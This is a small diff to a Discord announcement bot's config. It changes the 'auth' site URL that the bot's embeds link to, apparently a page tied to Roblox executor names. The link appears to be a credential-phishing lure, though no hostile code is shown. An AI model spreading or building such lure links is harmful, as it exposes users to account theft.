@@ -22,7 +22,7 @@ const TOKEN = process.env.DISCORD_BOT_TOKEN;
 
 // 4️⃣ Config embed + site
 const ANNOUNCE_CHANNEL_ID = "1432904664826908724";
-const SITE_URL = "https://www.logged.tg/auth/solarv2";
+const SITE_URL = "https://www.logged.tg/auth/arceusgenn";
 const TOP_BANNER = "https://cdn.discordapp.com/attachments/1436416072252260362/1436418034352001124/standard-3.gif";
 const BOTTOM_BANNER = "https://cdn.discordapp.com/attachments/1436416072252260362/1436417921894060072/standard-4.gif";
 const THUMBNAIL_EMOJI = "https://cdn.discordapp.com/emojis/1435132470742749266.png";
